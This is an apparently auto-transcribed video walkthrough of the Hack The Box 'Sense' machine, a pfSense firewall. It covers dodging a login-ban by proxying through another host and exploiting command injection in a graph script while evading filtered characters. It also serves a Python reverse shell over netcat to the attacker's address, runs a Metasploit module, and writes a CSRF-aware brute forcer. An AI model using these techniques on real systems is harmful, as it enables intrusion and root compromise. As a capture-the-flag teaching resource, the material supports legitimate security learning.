 what's going on YouTube this is if SEC and we're doing sense from hack the box which is pretty much just a vanilla installer pfSense so good news is it's a very real box and you come across this in pen test the bad news is it's a very real box that created it make money modifications and the box is still gonna ban you after 15 failed login attempts and that band is gonna last 24 hours so a lot of people took this as the box crashing and just gave up on it instead of trying to ssh to another machine that they compromised and hitting the box to see if the box paying them or not that's a very very valuable lesson because number one when a CTF if you get banned from doing a brute force maybe you should go back to the recon phase and see if you missed anything number two if you're on the pen test crashing a box is very very very bad so you always want to verify if the box banned you or if you crash the box because you never want to go back to the customer and say bad news your boxes crashed because one or two things is gonna happen they're gonna say no it just banned you shouldn't you have known that you're the professional or number two they're gonna reboot the box and cause unnecessary downtime both of which look bad on you so I'm gonna still go and do the brute force method and show it banning us just because that's a good learning experience so let's just jump in first thing we do is a add map so and map - SC default scripts sv versions Oh a output all formats in the directory and map will call an initial then the IP address of sense which is 1010 1060 it should be noted if this was different firewall products it may do like the - s T to do a full TCP scan because by default and map does a syn scan which just only does the first two parts of the TCP handshake you have the sin then you have the sin act then you have the ACK and you send a sin out if you receive a sin act the ports probably open and that's what the sin scan is if you send a sin out and you get like a fin or you get nothing port is closed so that is the same scan if you never bother with that third step it speeds things up the downside is if firewall products see you never completing that whole handshake it may flag you as a bot and start blocking you so that's why you may add the - st flag but in this case you don't have to the and map takes a while so let's just look at the results and we do see two ports open 80 and 443 so let's go over to 1010 1060 and we just get a pfsense page I'm gonna disable my proxy and refresh so we can view this certificate if we go to details and I'm just scrolling down this to see if we have any user names or anything and it looks like we don't the CN comma name eg your name so they just copied whatever the standardout was saying unfortunately no use names in that CA so let's go back to the pfSense page and turn intercept on and do a login we do see pfSense does have a cross-site request forgery cookie so if we do a brute force err it has to have the cross-site request forgery and probably the PHP session ID so we'll keep that in the back pocket but while we write that brute force so let's start a go Buster to see if we can find anything so op - go Buster go Buster and specify - H we only do - w-4 a word list user share word list der Buster directory list - 3 medium text - you for URL HTTP 10 10 10 60 I did HTTP because HTTP redirect me to HTTPS I have to do - k - ignore SSL certification verification and then I'm also gonna do - X to add extensions to every file in my word list the reason I did this is because the first one didn't me any good results and then once I got blocked by brute force saying I went back to see if I could find any files I did txt PHP back in a bunch if we do all that it's gonna take a while so we're just gonna leave it at txt let that run I open up a new window and cause pfsense to be honest so let's go back to a burp window take our login request copy as a curl command and let's create a script at the end of the video we're going to create a Python script to actually brute-force this but right now we just want to create a script to get banned that's ugly so set move to paste it's still ugly but it'll do so let's run a command do for I in sequence 0 to 15 I said sequence to type it do at the very end echo I done so that's just going to run this coral command to send this failed login 15 times so on this one 2 3 4 5 6 7 8 9 10 11 12 13 14 and it stops at 14 not 15 because we started at 0 so this is actually the 15th request and then we get banned so if we control see out of this curl 10 10 10 60 nothing if we ssh into a box that we've compromised before think enter the password this one yep got in and I run that same curl command 10 10 10 60 we need V V V to view the headers that works so maybe it's just HTTP that blocks us yeah we've blocked on port 443 not 80 so if we do ko - ke HTTP we get a page back and just verify there's no typos we can copy and paste and we don't get anything so what we can do is I [Music] never get the console command and SSH nope that's close there's some magic hotkeys in SSH we can turn tunneling options on when you're in the request just can't remember them right now so it's gonna do - deep 1080 and - D is a dynamic port it's going to create a Sox version 5 proxy through this SSH connection and then my web request we were to go out this proxy so if we do that type that password again I do a net stat - a Ln P grab for listen grab for 1080 we can see my box is listening on port 1080 and all those connections go to nibbles which is just a box I need the password - and you can use any box that's SSH accessible and then go out that box so we can prove that by going into burp you can send this login to questioner Peter tab click go nothing happens because again we are banned if we go to the user options tab go to socks proxy and click new socks proxy and we have our localhost 1080 go back to this repeater tab click go we get a page back and again we can configure a local box if we do Kol htps that's in my history no page by V Etsy proxy chains change this to the socks5 option socks for is for Metasploit socks v is the ssh go back to this curl command type proxy chains to tell curl to go through the proxy I've set and we get a page back so if you got banned and didn't want to revert the box this is one way you can work around it and it's definitely helpful in a pen test situation where you can't just revert the box and need to find a way around the band just proxy a connection to another host and try it there and that way you don't have to revert and you can begin resuming your testing so with that being said let's jump in to actually exploiting pfSense so let's go back to the go Buster pain and I just realized we're not gonna get the two files we need because we're band and go Buster isn't going through that proxy so if you ran the command up there you'd find these two files eventually it is system - users text and change log text so just gonna pretend go Buster finished because I don't feel like reverting the box and we'll just continue through the proxy so change log txt let's turn intercept off and we see two out of three vulnerabilities were patched the next one be done during the next maintenance window so the change log that text shows us there's a vulnerability in this PF sense that we have to exploit the other file system - users txt says the username is Rohit and the password is company defaults so let's go back to pfsense try rohit and then try the default pfsense password which is PF sense and we get in and i think that is the way you're supposed to get it to this box I never I didn't find the password laying around anywhere for what the company default is I think at that point once you get to you you're supposed to guess PF sense so we have the pfSense version information so we can Google pfSense CVE to pull up the CVE database and I just realized because I'm going through the proxy I have to disable this because the boxes don't have internet access so there's gonna be a fun dance of going from Google back to birth what not because it was sending the proxy requests over to nibbles and then trying to go out to the Internet which it's gonna have a bad time because nibbles doesn't have access to Internet so that's why I had disabled it the first CVE that jumps out to me is this one but the publish date was January 21st and I think that came out after nibbles I think nibbles was in 2017 but we can test his vulnerability at the end just because it's another vulnerability and then scrolling down we do see let's see it shows you have to go to reading all these because both of these 19 and this to boots get remote code execution but one's a 9 one's a 6 5 and this is just because of the author we got partials here and completes here for confidentiality integrity and availability so just based upon the submitter he said the confidentiality integrity and availability was a complete compromise once you had exploited this because you get root access for some reason the one down here was only where is it I can't find it it's only said partial but this the CVE will be going against because this was published when the box was published there are no Metasploit modules there is one wet work and MVR okay we'll go into mattis point had created one because this box we got a reference material he'll at exploit dB so let's go there and see what this says this is an exploit script see is this the one I don't know what exploit script this is but that's funny so this is a different one apparently to exploit this I guess we can see if this works see you know CSRF token huh I guess you can try this one that's funny that oh it's not a mess plate module it's just a Python exploit script okay I digress if we just google pfSense exploits we can find a good blog post on protein sex so we got one part for directory traversal part to command ejection command injection sounds pretty good additionally this post was written May 19th 2015 if we google let's see what was it go back to PF sense to 1/3 and always google is a change log to see release dates we see to 1/3 was probably November 11th 2014 and this blog post was May 19th so good chance that it's vulnerable to this and it said that two out of three were patched we got one there that's the second one and here's the third one I know the first you got passed we're not going to run through them just time sakes and for some reason my throat hurts I don't want to be talking for two hours like I did on enterprise so the status OD graphed image that PHP is vulnerable to command injection where the vulnerability exists how exec is called so this is showing the script we see if string is current database cues exec bin RM dash F or D path care if cues see log there we go we got cur database here and we got kurt database is equal to base name of database so get parameter here and then code execution because he gets passed down here so that's exactly how that works coulda swore was up here as well but I guess not so we just have arm - F specifying this so we should be able to put like a semicolon to give it get command execution so we have to find out where this is so let's go back to pfSense Turner socks proxy on because we are banned and notice all these dropdowns don't work except for status and we got our D graphs and based upon this command injection and status our D graphs image dot PHP good chance that we want to go to this so I'm gonna right click view image and then we get a long URL let's just get rid of all this and it's we said the vulnerability was in this database parameter if we go here we got to get request to database so we can't do it post it has to be a get and we just have to specify standard command execution so let's send this over to Bert send this true Peter and sent everything let's just get rid of some things to make this cleaner doesn't need all these arguments and this had current database is queues so that's why in my Burpo quest I change database two queues and then we just got to do command execution so let's do sleep plus two URL encode ten if we hit go it's not coming back it's either we're bandits not going through the proxy or it's this sleep command that is waiting ten seconds so if we get a thing back at 11 seconds chances are that executed a command so if we do echo if SEC and we have to your own code that space click go comes back right away the downside is we don't have any output to standard L so what we can do is we can do that echo if SEC and pipe this to netcat if net cats on the box and then our IP address which is 10 10 14 6 I believe and a port number will do 9000 it's gotta be over 9000 9001 there's no reason to ask me over 9000 I just want to say that but let's create a new window net cat LV NP 9001 click go go back here and we get it set back so we have command injection and we can actually get output back so if we just ran Who am I and click go we get root if we run Hearst name we get pfSense not local domain so we definitely have command injection on this box as the user root so the next thing I want to do is let's do a fine command so I'm going to output everything to a file and we'll call this file system dot txt and we can just do find plus slash click go and wait get anything which is a bit weird if we do find dot we get a response back and we can cat file system text so it looks like we may have a bad character so how I identified this is echo ABC make sure a command works get rid of that pipe a director click go ABC works listen again let's do ABC / click go nothing so we can't do that slash character what we can do is do environment env and we have the slash character in the home parameter or home variable I could do old PWD but if I ever change the directory then this variable is gonna change so I'm gonna do it in home so if I do echo is it all caps I think echo home yep we can do if sac we should see slash shape sack yep so we got the slash variable there by just taking one of the environment variables so now we can do find plus slash and we want to do this to file system click go and this request is taking a little bit longer if we look at file system now we have every file on the file system of pfSense so we could grab this for root txt see it's in root text and then also grep this for user dot X and see home rohit user dot txt so we could grab those files by just doing a WC - c then we'll do home C this is gonna be so this is just a slash so home home home home cubed users not use this rohit term again to add another slash user dot txt and the reason why I'm just doing - C is because I don't want to actually get the contents of the flag because that would be spoiling it for people so we can just do 9001 click go and we don't get a call back so send this to a new tab see if we have another bad character so echo ABC verify a command works then we want to echo ABC then the new character we added was a dash and we don't get anything so now we have another bad character and there's no just - as an environment variable there are dashes here and in bash if we set something to this so we can do x equals that so if I echo X it's that variable and I can do X : what is that 1 2 3 4 5 14 the 14th character go for 113th character 1 and this is just the number of characters related to it's going to do - 1 but it'd be SD world that's not going to work unfortunately and bsd world is just because pfSense is bsd so we can do that try to do this echo command echo instead of X it's laying click go I have to do that plus it doesn't give us anything back which I'm surprised it didn't we echo Lang let's see if this gives us anything back yeah so I guess BSD has a different syntax to do that yeah weird but no fear I did it a different way I used the printf command and bash or not bash in Linux you have printf can do like backslash X 42 this the hex character for a I think would be 41 is a and different encoding none of these are bad characters unfortunately and BSD this isn't valid so if we send this then we can get rid of the echo click go we just get X 41 so if we Google print F BSD and we have to disable the proxy maybe I should just revert that box cuz that's annoying I could just stop going through the proxy for Google things now probably faster go to Google print F BSD see if we can find a quick way to do it examples I don't think this is it the man page maybe here we go so backslash num write a number who is the one - a three-digit octal number so if we you can enable socks box real quick we can do man ASCII to pull up the ASCII table and we're looking at octal and we want a period which is 56 so 56 octal is period so if we go back into burp the repeater tab printf backslash 56 oh we don't appear do we want to - we do have a period though and ASCII 55 is - so and see go back into burp there's a game much longer than I wanted it to but learning how to you a Dwight Vaught bad characters is a good skill so we have the - there so now we can try this WC command and watch WC not be on BSD WC + and we want to execute a command print F actually let's just do X is equal to print F backslash X 55 echo X verify this works need that thing and this is why you do exploits piece by piece instead of doing one giant chunk go huh X is equal to printf oh I have X it's just backslash 55 there we go so now we can do WC X that doesn't be - you know what I have an easier way to do this the test WC - the home row hit user dot txt % ass escape this I think we have to escape that maybe ok that - is now X and we also have to do the forward slashes so that is going to be home some pass forward slash home there we go cat test copy this Gobert paste that and URL encode with control you listen road 9001 and hopefully this returns like 32 or 33 doesn't return anything because WC probably not on the box that sucks let's do new tab I should have done more testing before I started recording we can do which WC and see if it is on the box it is I guess it just doesn't have that flag so we'll just do WC and this and we'll get a line count cuz I don't know the flags on BSD for WC turn I forgot to listen on that cat go this is so much harder to do that I don't want to spoil it we'll just get a shell eventually you get the drift gist of that I'm not sure why that isn't working / home rohit home user dot txt that should exist last file system user dot txt home rohit user dot txt yeah that should be working but do you file oh it's expanding that I'm an idiot it's always the easy things I hate life sometimes wc+ this is X C click go there we go 32 that is a md5 sum of home Rohit user dot txt that was much longer than it should have been oh well so let's go back and get a shell so the easiest way to do this is let's go to pen test monkey reverse shell and I'm just going to use this Python one you probably use any one there but we'll do VI CMD clean this up so it's a Python script probably don't have to just have it I guess and we want to send this to 10 10 10 6 1 2 3 4 will be fine and because this has a lot of lines I'm just gonna do netcat 10 10 10 10 10 no ovn P 9001 and going to do the direct CMD into that so if anyone connects it just sends that file so now one burp we can get rid of this and we just say netcat to ten ten fourteen six nine thousand one pipe that over to Python and do the ampersand to send that in the background and I want to control you that's not your own code of oh space there we go there's that ampersand so we could open a new tab again LVN P 1 2 3 4 click go we got the Kinect here and we didn't get anything here so let's view this command again 10 10 10 6 nope 10 10 14 6 cancel click go why did I kill that port listening do not go back connect ten ten fourteen six one two three four that should be good and see that's on nine thousand one does that need a blank line at the end I guess we can get rid of that ampersand should have screwed it up we can sing necked we can close out that socket and then we get a shell on pfSense so it looks like it didn't like that ampersand for whatever reason was that really 26 yeah not sure but with this we can just do WCC root X and we can see we can read that file as well so that is the manual way to do this box but if you are lazy let's see did they kill the box by doing that show nope still response we can just learn how my staff console and once this loads we can do I probably should start Postgres see if this is status it is running so just open up MSF console takes a little bit to load but once it does we can use the Metasploit module and then after we do this we can write that brute-forcing script so we can search PF sense and we want Graf injection and again I just want to highlight locate it should have been a ruby script there we go it was coded by cheap people from hack the box wet work and envy okay always try to highlight the people when hack the Box stuff does actual cool things so let's use this show options we can set the or host to be 10 10 10 60 set username rohit set password pfSense set l host time 0 and I know test this with proxies will try Sox 5 1 27001 1080 and I'm just following this format and we can hope for the best set reverse a while proxy to true and it looks like it's working the reason why it makes you set reverse allow proxy to qu is normally when you're using a reverse proxy things can't talk back to you but in this case it can and we're just using reverse proxy because we were stupid and had it blacklist us on port 443 but now we got meterpreter session 1 open we can drop to a shell and now we're on the box so it's that simple with Metasploit just simple search and put the parameters and go as long as you get the username so let us now jump into the part where we do the Python script to create the brute-force ER i have reverted the box so i can now go to it without the use of a proxy and the very first thing we have to do is look at a login request so if we go to HTTP history and i can search for a post we can see all the fields we need i'm going to copy this first request and we're going to create a new file called I will do bf - PF dot I for a brute force PF sense then first thing first split pane send this all the way down so I can execute code down here and I'm gonna create a nother split and paste the request I set paste that so does that let's just get rid of all these new lines okay and on the right side that would be handy eventually so very first thing we have to do is import requests and this is just a Python module to interact with web pages the next is re for regular expressions so we can search the contents of web page and pull data the reason why we have to do that is because this has a CSRF token on it as this CSRF underscore of magic and what that does is if we don't pass this parameter which is on the previous page it's going to invalidate a request the reason why they do this is to prevent cross-site request forgery which means if you went to a page that had some JavaScript on it without receive so after can that page could potentially navigate to another page and execute a request on your behalf I think the holiday video goes over that more in depth but that's why we're using Python to create something and not just Hydra because I don't think Hydra supports us after tokens easily you can also do it with Burt macro but that's in professional only and I try to keep these videos with free content only so we got to create a regular expression to pull a CRS CSRF token off the page so let's go to back here go to 1010 1060 sure we'll accept this cert control you to view source search it for CSRF and we see COF magic token is equal to double quotes the CID value is what we want and it ends with a double quote so we can paste that in regular expressions anything in between the parentheses is what you want to match and that should be good so we're taking everything between parentheses of the CSRF magic token variable very first thing we have to do is create a session variable and what this is doing is when we do a get request to a page and the page says hey set these cookies this what session does is it'll add this so a future request can use those cookies without us merely adding them it's a very nice thing so now we can do our first get request so our for response is equal to s get we're making a get request and then the second one will be the post and that's this one but first we have to make a get request to get that COF magic token so we can formulate this data response whatever this is payload so HTTP 10 10 10 60 slash index dot PHP and verify is equal to false and this flag just sets it so the SSL certificate validation is a that's like - ke & Co and then we can print or make this Python 3 or text so if we do Python 3 b f PF pi we have that so we get a page back what we need to do next is r is equal not CSRF is equal to r e for regular expression find all and we want to our e CSRF the variable up here now we have and we want it to search our text and we only want to pull the very first match so a serve print our text we can print CSRF and we do get something we also have an annoying error message from this saying unverified HTTP request is being made so I'm going to Google this and find out how to remove it it's a long annoying string and like URL Lib so Python and Google that let's see search I'm request package maybe this it doesn't look right but it may work security request is not find so we can go back there was a import there we go that warning is now gone so that is I guess just quality of life thing so next thing we have to do is the actual login request so we got that CRF token so we can do r is equal to s dot post HTTP 10 10 10 60 index dot PHP because that's where a post request is going and we need data is equal to a cookie and will create that cookie just above here so log in is equal to and we'll create a I think this is a dictionary so I'm just going to score CSRF underscore magic and that's just the very first parameter this will be CSRF it's not comma it's a colon then we need username FLD I don't want fo d stands for will do if sec and then password FL d can't code and then well again is equal to login and that should be good so now if we print our dot text we'll see what we get so let's see we get to the very top submit form I'm guessing just invalid username or password reading this HTML is a pain so what I'm gonna do actually is let's send this to burp so % s 1010 1062 1 27001 change HTTP to HTTPS secure warning request and this verify equals false then in burp I'm gonna go to options add a proxy listener buying on port 80 send this to 10 10 10 60 and force use of SSL so let's write this Python 3 and burp we can see the get request to index dot PHP and I also want to go to options intercept server response so we can see this response and make a post request and this one want to send repeater and we get CSRF check failed and we can see my cookie is only cookie test we don't have a PHP SS ID for a session ID if we go into HTTP history look at the last result we can look at the response and we see it telling us to set that cookie but for some reason it didn't and I don't know exactly why it didn't but I do know if this is a post request and not a get request request will behave as we expect it to so let's disable intercept run this again click forward we see PHP sside I guess I didn't intercept all requests but now we have a post to index dot PHP with that PHP SSID click go and now it looks like we're getting invalid username and password so let's own that one more time forward forbidden SEC one works again I don't know exactly what that's about if we render now we're saying incorrect username password not CSRF check failed so that's a good thing if we wanted to and the main reason I'm doing this is because I don't have 15 failed login attempts right now and have to revert we can see what a valid request looks like so Rohit and the password was pfSense so we're just gonna make I don't know why exited I guess habit but go back to the proxy I guess when you do a post request on index it's gonna say CSRF check failed that's weird but it still sets the cookie to PHP SSID oh it doesn't do cookie test maybe that's why maybe when I do this session and only to know as one cookie at a time and by doing this post it's only setting one cookie so that one cookie it sets is PHP SSID I guess that's exactly what happened so I should look at the proper way to add cookie so we can add multiple cookies at once if you want to do the get request but this works for now so let's send this request to repeater and we get a 3 or 2 found so we know on a valid login it sends us to a 302 and on a invalid login it just does a 200 so we can add that logic in a script and just say print instead of text we'll do our status underscore code and the reason why I know that is if you go to the request documentation and read this it tells you exactly how to use it if you're using something and the documentation is bad normally I'm in PI Chum and Python will do this automatically but if you don't have PyCharm you can copy the code you want then you can use ipython for interactive Python paste it and we probably have to say well intercepts and this can finish any time now I want the code just didn't like me delaying it okay all right dot yeah don't know why tear it so let's redo this to make this a bit cleaner make those two requests okay now we can do our dot and then hit tab and we have a bunch of options we can choose from so we could do our cookies and see that if we did our dot headers we can see the headers and r dot status code you can see 200 so that's how you can see those easily so the script should return three or two and then the CSRF token 200 because I don't know why 200 use name Rohit it should be 302 because this should be a valid login so let's see exactly what's happening intercept dawn make this post request it's going to yell at us for CSRF failure make this post request it's gonna send us a 302 found and then we're gonna go to index it's gonna go through to found then index dot PHP and then I'm going to pull that so request is following redirects and that's why this is 200 so if we Google request do not follow redirect and see if that's a quick option let's see this is gonna be as trivial so what we'll do is just search for our text and grab code I don't know I keep exiting I'm probably intercepting okay so we can look at a tag that would be valid if we log in and that's a lot of text so status equals dashboard in the title so if we just search for dashboard that should only be valid on valid logins so let's go back and I think it's if can we have its container in I think it's N and Python in our dot text print valid login else print fail and make this Python 3 old habits die hard okay we got a valid log in there so let's put a invalid password or invalid username will just get rid of that oh so now we have some logic detecting if it's a valid or invalid login so the next thing to do in a brute-force search is just loop this so we can do get out of this create a file let's say passwords txt password one pass with two we'll do three four five and then the good password pfSense okay so now we can loop that file and print fail and we want to do a s cookies clear the reason why I want to do a cookies clear if we fail is just because I want to clear my PHP session ID don't have to just have it okay so now we have to do F is equal to open file I don't know why I called that passwords text and then we want to I think we have to specify read I think we can just do F equals the open pastures text and then lines it is equal to F dot read line and then we can do for line and lines one two three four and we'll do actually for password in lines username Rohit password field this will be password and valid login we're gonna do % s in Python 3 this will be Rohit and password failed password see if that works syntax error on line 19 then indent that still indexing on 19 see print we need two parentheses and that's not looping by line that is looping by character it looks like so we got to fix that no I actually don't need lines equals read line and just do this wise equals open password dot txt and see if this works there we go that's what I expected and we just locked ourselves out bollocks foxy chains I guess that's not up anymore so let me revert the box and we will run the script and see if it works Fox reverted so let's run this again and it failed all the time I know I promised to change field because we haven't set one 27001 but let's see the HTTP history of what was happening CSRF check failed CSRF check failed so we're filling a CSRF check for some reason oh no that's the initial get without a response 200 ok request user name that pfSense sent Oh a let's go back in the code so we have to go back one character I guess because that's a line break so let's do I python x equals test and X then X minus 1 okay that's what we need that is just some kung-fu to strip the last character so password minus 1 go exit execute there we go and now the brute-force script works again can't really do too many lines because well it will lock us out if we want to get rid of these line characters you could also just probably terminate that last line here let's see password and we can probably say cuz it here it's probably here No Oh fala bargain I was on not invalid luck to sell awesome I'm guessing that will work so we don't have all those blank lines but I'm too lazy to revert the box again so hope you guys enjoyed that video take care and yeah I think I can test this real quick let's see if I was right about proxy chains failing because I was going through Bert so actually we can go through Bert click user options use socks proxy and run this there we go and that does get rid of all those blank lines doing it that way so I hope you guys enjoyed the video take care and I guess I'll see you next week also let me know if you like these longer videos or you want to keep them shorter I'm not true so yeah later